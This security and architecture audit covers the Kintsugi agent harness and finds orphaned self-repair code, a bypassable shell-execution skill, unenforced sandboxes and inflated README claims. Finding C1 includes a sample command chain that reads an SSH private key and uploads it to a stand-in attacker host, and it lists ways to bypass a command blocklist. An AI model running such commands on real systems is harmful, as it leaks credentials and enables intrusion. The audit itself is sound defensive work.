# Kintsugi Audit — Fable 5

**Date:** 2026-07-02
**Scope:** Full codebase read, focus on `kintsugi/skills/`, `kintsugi/bdi/`, `kintsugi/cognition/`, `kintsugi/kintsugi_engine/`, and `tests/`.
**Method:** Every file in the focus areas read in full by five parallel auditors; supporting subsystems (memory, security, plugins, multitenancy, adapters) swept; test suite executed; headline claims verified by hand (import test, shell-exec path, test collection).

---

## TL;DR

Kintsugi is a **well-written, well-tested library of self-repair primitives that nothing actually runs.** The BDI / EFE / shadow-fork machinery the project is named for is real code with 2,283 passing-ish unit tests — but it is **orphaned**: no runtime path instantiates it. What the shipped FastAPI app actually serves is a message logger with PII redaction, keyword routing, and pgvector memory retrieval. The "self-repairing agentic harness" does not self-repair at runtime, because the repair loop is (a) never invoked and (b) internally simulated even when invoked.

Three findings need attention **before** any of this is deployed:

1. **`BashSkillChip` is unauthenticated arbitrary command execution** with a trivially bypassable allowlist (`core_ops/bash_executor.py`). This is the single most dangerous file in the repo.
2. **The v2 skill-execution route fails to import and is silently dropped** at startup (`api/routes/agent_v2.py:19`), so the entire skills/tree/DAG pipeline is dead in production — and the failure is swallowed with no log line.
3. **Every subsystem that claims a safety property** — plugin sandbox, tenant isolation, shadow sandbox, Shield, PII middleware — either isn't wired in or doesn't enforce what it claims.

The README's headline numbers are inflated: "600+ tests" is actually 2,283 collected (good); "22 skill chips operational" is 24 chips of template CRUD over in-memory dicts with fabricated data, 0 registered at runtime; "~77,000 lines" is accurate (~58k in `kintsugi/`).

---

## 1. What actually runs vs. what ships

The Docker entrypoint is `uvicorn kintsugi.main:app`. `main.py` builds a FastAPI app, adds CORS, and registers five route modules inside a blanket `try/except (ImportError, AttributeError): pass` with **no logging** (`main.py:49-55`). There is no background loop, no worker, no pulse — only uvicorn's request loop.

**Live at runtime (4 real, load-bearing modules):**

| Module | What it does |
|---|---|
| `security/pii` + `security/monitor` | Regex PII redaction + ~20-pattern command blocklist on `/api/agent/message`. Real, runs. |
| `memory/cma_stage3` + `memory/embeddings` | pgvector hybrid retrieval with real sentence-transformers / OpenAI embeddings. Real, runs. |
| `cognition/orchestrator` + `model_router` + `llm_client` | Keyword routing → optional Anthropic completion. Real. |
| `cognition/efe`, `fast_classifier` | Used as libraries by the router (see "EFE naming inflation" below). |

**Orphaned — importable, tested, never instantiated by any runtime path** (verified by grep: zero importers outside their own package + `tests/`):

- **The entire `kintsugi_engine/`** — shadow fork, verifier, promoter, evolution, staged pipeline, calibration, drift, bloom. *The self-repair loop the project is named for.*
- **All of `bdi/`** as a consumed system — `BDIStore` is instantiated only in tests; `Orchestrator.attach_bdi()` has zero callers; `Organization.bdi_json` exists in the schema and is never read or written.
- `engine/pulse.py` (the "universal heartbeat") — zero importers, zero tests.
- `cognition/active_inference.py`, `enhanced_orchestrator.py` (transitively dead via finding #2), `proactive_advisor.py` → `memory/dreamer.py` chain.
- **All of `skills/`** at runtime — the registry is never populated (finding #4).
- All `adapters/` (discord/slack/email/webchat), `governance/`, `comms/`, `tuning/`, `integrations/`, `plugins/`, `multitenancy/`.
- `api/middleware.py` (auth/PII/logging middleware — written, never added to the app) and `api/websocket.py`.
- Celery + Redis: dependency and a compose container exist; no worker or task module exists anywhere.

**One-line verdict:** what runs is a FastAPI message-logger with PII redaction, keyword routing, and vector memory. The named architecture is a shelf of well-built parts that were never assembled.

---

## 2. Critical findings

### C1 — `BashSkillChip`: unauthenticated arbitrary command execution
`kintsugi/skills/core_ops/bash_executor.py`

The design is blocklist + prefix allowlist + `create_subprocess_shell`. All three tiers fail:

- **Allowlist bypass (verified).** `classify_command` uses `pattern.match(stripped)` (line 93) with prefix regexes like `^echo\b`, `^ls\b`. `.match()` anchors only at the start, so `echo ok; cat ~/.ssh/id_rsa | curl -T - attacker.com` matches `^echo\b`, is classified `always_allow`, and the **entire chained string** is handed to `create_subprocess_shell` (line 126). Any shell operator (`;`, `&&`, `|`, `$(...)`, backticks) after a safe prefix defeats the model.
- **Blocklist is a shell blocklist** — bypassable via `bash -c`, `python3 -c`, base64, absolute paths, quoting (`su""do`), variable expansion. The fork-bomb pattern (line 31) is even written wrong: `:(){ ... }` treats `()` as an empty regex group, so the real fork bomb doesn't match.
- **Secret exfiltration built in.** Line 131 passes `env={**os.environ, "HOME": ...}` — every executed command receives the service's full environment, including `ANTHROPIC_API_KEY`, DB creds, etc.
- **Approval gate is honor-system.** Line 116 reads `request.parameters.get("approved", False)`; in a DAG, `parameters` is built from upstream node output (`dag.py:185-188`), so any upstream node emitting `approved: True` satisfies it. No identity, no audit, no re-verification.
- **No isolation.** cwd + a cosmetic `HOME` override; no chroot/namespace/user. The child has full network and filesystem access as the service user.

**Why this is C-severity even though skills are unwired:** the chip executes `request.raw_input` (line 99), which is the raw user message. The moment finding #4 (empty registry) is "fixed" and chips get registered, an internet-facing POST body starting `echo hi; <anything>` becomes remote code execution. **Fixing the registration gap without first fixing this weaponizes the API.**

*Fix:* argv execution (no shell), `shlex.split` + strict binary allowlist, `start_new_session=True` with process-group kill, minimal scrubbed env, and OS-level sandboxing (bubblewrap/nsjail/container) if arbitrary commands are genuinely required.

### C2 — v2 route dead-on-arrival, failure swallowed
`kintsugi/api/routes/agent_v2.py:19` imports `_get_llm_client` from `agent.py`, which defines only `_get_orchestrator`. Verified: `ImportError: cannot import name '_get_llm_client'`. Because `main.py:49-55` catches `(ImportError, AttributeError): pass` with no log, `/api/v2/agent/message` — **the only route that wires tree discovery, DAG composition, and skill-chip execution** — is silently never registered. The app serves only the v1 keyword→LLM route. This same swallow-without-logging pattern is what let the bug ship.

### C3 — Shipped Docker image cannot make LLM calls
`anthropic` is in `requirements.txt` but **not in `pyproject.toml`**, and the Dockerfile installs the pyproject-built wheel. In the shipped container, `create_llm_client()` raises ImportError, which is swallowed (`agent.py:51-52`), so every request returns the "Configure ANTHROPIC_API_KEY" stub regardless of configuration. The two dependency manifests disagree materially (pyproject also lacks `openai`, `redis`, `aiosqlite`; requirements lacks `celery`, `pgvector`, `opentelemetry-*`). No lockfile; all versions unpinned floors.

### C4 — Fresh deploy 500s on first request
No `alembic upgrade head` runs in the Dockerfile, compose, or any startup script. The lifespan health check only does `SELECT 1`, so the app boots "healthy," then every `/api/agent/message` 500s on missing tables. Also `migrations/env.py:13` imports only `models.base`, not `models.tenant`, so autogenerate silently omits `tenants`/`audit_logs`.

---

## 3. The self-repair engine is simulated, not real

Even setting aside that nothing calls it (`kintsugi_engine/*` is imported only by `tests/`), the loop does not do what the README's five-stage diagram claims:

- **Shadow fork forks nothing** (`shadow_fork.py:148`). `fork()` deep-copies a config dict and mints a UUID; "execution" in mock mode echoes the input and replays a `mock_tool_responses` dict; sync "live" mode returns a hardcoded `"[live-sync placeholder for: ...]"` string (line 385). No process, task, or agent is ever spawned. `max_memory_mb` is documented as "enforced at the process level" — there is no process.
- **The verifier measures sameness, not improvement** (`verifier.py`). "Evaluation" is word-Jaccard similarity to the primary's output. A modification that changes nothing scores quality≈1.0 and gets APPROVE; a modification that genuinely improves behavior necessarily diverges and gets penalized. Empty evidence also yields APPROVE (lines 141-146: quality defaults 1.0, safety "skipped" → passed). The computed `alignment_score` is **never read** by the verdict — BDI misalignment cannot cause rejection despite being the stated purpose.
- **The promoter applies nothing and can't roll back** (`promoter.py`). `promote()` returns a merged config dict that no code writes to a file, DB, or live agent. `rollback()` returns a past config but records nothing — the trace history still shows the rolled-back change as promoted, and the "immutable golden trace" audit log is trimmed to the last 10 entries (`max_rollback_depth`). Promotion also accepts `shadow_id`, `modification`, and `verification` as unrelated arguments — nothing binds the `VerificationResult` to the modification it supposedly verified; a hand-built APPROVE promotes anything.
- **Fork and promote use different merge semantics** (`shadow_fork.py:152` shallow `dict.update` vs `promoter.py` deep-merge). So the config the shadow verifies is not the config the promoter applies — even the *simulated* loop verifies the wrong artifact.
- **Staged pipeline's safety features are dead config fields.** `gated_traffic_fraction` and `monitored_rollback_threshold` are never referenced — no traffic splitting, no auto-rollback at MONITORED. `submit_human_approval` can be called before a deployment reaches GATED, pre-approving the human gate.
- **The one place the system actually self-modifies bypasses all of it.** `engine/pulse.py:229-275` (`evolve_check`/`evolve_action`) hot-swaps the agent's own checks/actions with only an in-memory log entry — no shadow, no verifier, no gate. The safety machinery doesn't apply where self-modification actually happens.

**Zero persistence anywhere in the engine or BDI.** Shadows, traces, proposals, deployments, pending human approvals, feedback, tuner state — all plain in-memory dicts. A restart loses all promotion history and rollback capability. For a "self-repairing harness," no self-modification or belief state survives a process restart.

---

## 4. Skills layer: real infrastructure, zero load

- **Registry never populated (runtime-dead).** No production code calls `register_all_core_ops_chips()` — only tests and docstrings do. `agent_v2.py` builds the CapabilityTree from the **empty** global registry, so `decision.skill_names` is always empty and every request falls through to the raw-LLM branch. (Moot today anyway because of C2.)
- **The 24 chips are template scaffolding.** Every chip file contains `"Simulated"` / `"In production, this would…"` markers (grep-confirmed). No chip calls an LLM or any external system. `staff_onboarding.py:686` returns a hardcoded "Jane Smith, 65% complete" for *any* employee_id; `_complete_onboarding` fabricates HR/IT sign-offs with invented names and an `average_score: 92.3`. `impact_auditor.map_to_sdg` is a keyword dict with a fabricated confidence formula. `know_your_rights` returns "1-800-LEGAL-AID" for any location.
- **Shared mutable class-level storage.** `mutual_aid_coordinator.py`, `coalition_builder.py`, `resource_redistribution.py`, etc. define `_needs: dict = {}` etc. **on the class** — all instances share it, no `org_id` scoping, so one org's data is visible to every org, and everything vanishes on restart.
- **`BoundaryGuardian` shares state across all users** (`boundary_guardian.py:110`) — one chip instance serves everyone, so user A's violations escalate user B to termination, and control actions (`reset`, `terminate`) come from unauthenticated `request.parameters`. Its "detection" only reads `context.metadata` flags that the client itself supplies.
- **DAG execution is broken end-to-end.** `execute()` never calls `validate()`, ignores edges entirely (schedules by declared `layer` int only), and reports `success=True` when every node returned `success=False` (only exceptions count). `from_skill_sequence` passes the skill *name* as the intent, so every node returns "Unknown intent" — which `agent_v2` then returns to the end user.
- **`intimate_ai/` leftover:** source removed in `ecdc853`, but `kintsugi/skills/intimate_ai/__pycache__/*.pyc` remains on disk (gitignored, untracked). Decompilable. `rm -rf kintsugi/skills/intimate_ai/` if the removal was meant to scrub content locally.

---

## 5. BDI / cognition: real primitives, decorative integration

- **"EFE" naming inflation.** Three subsystems invoke `EFECalculator` (routing, proactive advisor, policy selection). In all three the risk/ambiguity/epistemic inputs are constants or duplicates of one upstream signal (keyword-hit share, urgency, node count), so the decomposition is presentational — it re-derives the keyword winner with extra arithmetic. The one function that draws inputs from an actual world model (`calculate_efe_from_world_model`) is called only by tests.
- **The "Bayesian belief update" isn't Bayesian** (`efe.py:98`). `confidence = min(confidence + obs_conf*0.5, 1.0)` rises unconditionally — contradicting observations never lower confidence. Downstream this zeroes the epistemic/information-gain term exactly when the model is most wrong.
- **Active inference policy selection is degenerate** (`active_inference.py:479`). Every candidate policy is scored against the same current-state prediction (not policy-conditioned), so EFE ranking collapses to a node-count heuristic — it cannot distinguish *which* skills a policy uses.
- **Frozen-dataclass bug makes BDI coherence dead code** (`orchestrator.py:293`, verified). `decision._bdi_coherence = ...` raises `FrozenInstanceError` (swallowed by `except Exception: pass`), before the low-coherence warning — so coherence is never logged, warned, or attached. `attach_bdi()` is additionally never called.
- **FAST_DENY doesn't deny** (`orchestrator.py:204`). A deny-pattern hit ("surveil", "dump database") returns `skill_domain="blocked"` "so Shield catches it" — but nothing checks for it; the request proceeds to a full LLM completion. The two block lists (`SecurityMonitor` in the API layer, classifier deny patterns in routing) are unconnected and only the first enforces.
- **Budget enforced after spend** (`llm_client.py` + `model_router.py`). The paid API call happens first; `cost_tracker.record()` then raises *before* updating cumulative spend, so the response is discarded, spend is never recorded, and the next call spends again and throws again — a repeated post-hoc exception, not a cap.
- **Seed tier sends `"local/default"` to the Anthropic API** → guaranteed 404 on every completion; there is no local-model code path.

---

## 6. Supporting subsystems (sweep)

| Subsystem | Status | Most serious issue |
|---|---|---|
| `memory/` | Real algorithms, mostly orphaned | Spaced repetition reads a nonexistent `_access_count` column → interval is always 1 day; the curve never advances. `dreamer` consolidation raises `AttributeError` every cycle (Stage1/Stage2 type mismatch), swallowed. `significance.py` maps high significance → short TTL (inverted scale). |
| `security/` | PII/HMAC real; sandbox cosmetic | `ShadowSandbox` runs untrusted code via plain `subprocess.run(["python3", script])` with full network/filesystem access — "so destructive code never touches the host" is false. Shield's `_next_midnight` builds `datetime(y, m, day+1)` → `ValueError` on the last day of every month. PII middleware keeps the original `Content-Length` on a redacted (shorter) body → truncated responses; and it's never installed anyway. |
| `plugins/` | Real machinery, no isolation | `loader.discover()` calls `exec_module()` at discovery — arbitrary code runs before any sandbox/quarantine check. `RestrictedImporter` implements only the pre-3.12 `find_module`/`load_module` API (removed in 3.12, the target) → import restrictions never fire. Resource RLIMITs are set on the whole host process and can't be restored. Orphaned. |
| `multitenancy/` | tenant/context/quotas real; isolation a stub | `TenantIsolator` records RLS policies in dataclasses; the actual SQL "exists only in comments"; `verify_isolation` returns True from set membership. Quota counters are per-process memory (multi-worker → trivially exceeded). `X-Tenant-ID` header trusted with no auth binding. Orphaned. |
| `adapters/` | Mixed, none wired | discord = scaffold (no `discord.py`, `start()` just sets a flag). slack/email = real integrations (real SDKs, could connect) but no event endpoint is mounted. webchat = real router, not in `main.py`'s route list. None registered/started at runtime. |

---

## 7. Test suite

- **2,283 tests collected** (README says "600+"). Runs green except: 2 assertion failures in `test_skills_base.py` (domain/capability enum counts drifted after the `da0388a` extension — `assert 20 == 10`, `assert 9 == 8`), and 1 failure from a missing `aiohttp` dep in `test_adapters_slack.py`. ~30 skips. `test_security_invariants.py` takes 99s alone (probably real crypto/bcrypt work) and the full run OOMs if not batched.
- **Honest unit tests of in-memory logic** — no `assert True` theater. But structural gaps:
  - **The repair loop is never tested end-to-end.** fork → verify → **promote** as one flow is tested nowhere; the Promoter is tested only in isolation with hand-built `VerificationResult`s. And what the shadow-fork tests verify is a dict-echo stub, not an agent.
  - **Zero coverage of the runtime surface.** No conftest, no fixture touches a DB, **no test imports `kintsugi.main` or uses `TestClient`** — the FastAPI app, all five route modules, `db.py`, middleware, and websocket code are completely untested. C2 and C3 would both have been caught by one `TestClient` smoke test or a Docker build in CI.
  - **117 bare `is not None` asserts** and many assertions nested under `if x:` guards (e.g. `test_active_inference_bdi.py:571`, `test_end_to_end.py:243`) that pass having tested nothing when routing returns empty.
  - **CI (`ci.yml`) hand-enumerates test files and omits** `test_end_to_end`, `test_integration_pipeline`, `test_active_inference*`, `test_staged_pipeline`, `test_verifier`, and more; no ruff/mypy job despite `strict = true`; no Docker build check; no coverage.

---

## 8. What would make it production-ready

Ordered by priority. The first group is "before this touches a network."

**P0 — safety and honesty**
1. Rewrite `BashSkillChip` to argv + binary allowlist + OS sandbox, or remove it. Do this **before** wiring the registry (C1).
2. Fix the `agent_v2` import and **remove the blanket `except: pass`** around route registration — fail loud, log the traceback (C2).
3. Reconcile `pyproject.toml` ↔ `requirements.txt`, add a lockfile, pin versions, and add a Docker-build + `TestClient` smoke test to CI (C3).
4. Run migrations on startup (or document the step) and add a readiness probe that distinguishes DB-up from DB-migrated (C4).
5. Align docs with reality: "600+" → 2,283 tests; "22 skill chips operational" → "24 skill-chip scaffolds, not yet runtime-registered"; the five-stage pipeline diagram should be marked as design intent, not current behavior. As written, the README and CLAUDE.md describe a system that does not exist at runtime.

**P1 — make the core claim true**
6. Actually wire *one* path end-to-end: register chips → route to a chip that does real work → run it under a real shadow that spawns a subprocess/task and executes against a real (mock-server) workload → verify improvement with a task-success metric (not word overlap) → promote by writing config that a running component re-reads → roll back on regression with a persisted, append-only trace.
7. Give the engine and BDI a persistence layer (SQLAlchemy models for traces/deployments/proposals/BDI state; `Organization.bdi_json` is already in the schema and unused). Nothing self-repairing can lose all state on restart.
8. Fix the verifier so it can detect *improvement* (it currently structurally cannot) and so `alignment_score` actually gates the verdict.

**P2 — correctness cleanups (from findings above)**
9. Frozen-dataclass BDI write (`orchestrator.py:293`); FAST_DENY enforcement point; budget-before-spend ordering; Shield month-end `ValueError`; spaced-repetition access-count column; dreamer Stage1/Stage2 type mismatch; inverted significance scale; DAG `success`/edge/intent bugs; per-instance state on `BoundaryGuardian` and the aid chips.
10. Real isolation for the plugin and shadow sandboxes, or delete them and stop advertising the property. A sandbox that doesn't isolate is worse than none — it invites trust it can't honor.

**P3 — hygiene**
11. Auth (declared `python-jose`/`passlib` are unused; no route has an auth dependency); secrets guard (`SECRET_KEY = "CHANGE-ME-in-production"` with no startup check); remove dead Redis/Celery infra or implement a worker; initialize the OTel tracing that's declared but never started; `rm -rf` the `intimate_ai` bytecode.

---

## Appendix — headline claims vs. findings

| Claim (README / CLAUDE.md) | Reality |
|---|---|
| "Self-repairing agentic harness" | Repair loop is orphaned and internally simulated; the one real self-modification path (`pulse.evolve_*`) bypasses all safety machinery. |
| "Fork shadow copies to test changes" | `fork()` deep-copies a dict; no process/agent is spawned. |
| "Shadow catches 40% of regressions" | Verifier measures similarity-to-primary; it structurally cannot detect a regression *or* an improvement. |
| "Auto-rollback triggers" at MONITORED | `monitored_rollback_threshold` is an unreferenced config field; `rollback()` records nothing. |
| "Hard constraints self-modification cannot override" | Shield is orphaned; the deny classifier doesn't deny; constraints aren't enforced at any runtime chokepoint. |
| "22 skill chips operational" | 24 template scaffolds over in-memory dicts with fabricated data; 0 registered at runtime. |
| "600+ tests" | 2,283 collected — but none cover the HTTP/DB/LLM runtime, and the repair loop is tested against a stub. |
| "Sandboxed plugin execution" | `exec_module()` at discovery; import restriction dead on Py3.12; RLIMITs hit the host process. |
| "Multi-tenancy: ROW_LEVEL / SCHEMA / DATABASE isolation" | Isolation SQL "exists only in comments"; `verify_isolation` returns True unconditionally. |

*The engineering underneath is genuinely competent — clean dataclasses, real embeddings, correct HMAC, thoughtful state machines. The gap is not skill; it is that the parts were built and tested in isolation and never integrated, while the docs describe the integrated system as if it exists. Closing that gap — wiring one honest end-to-end path and making the docs match — is the whole job.*
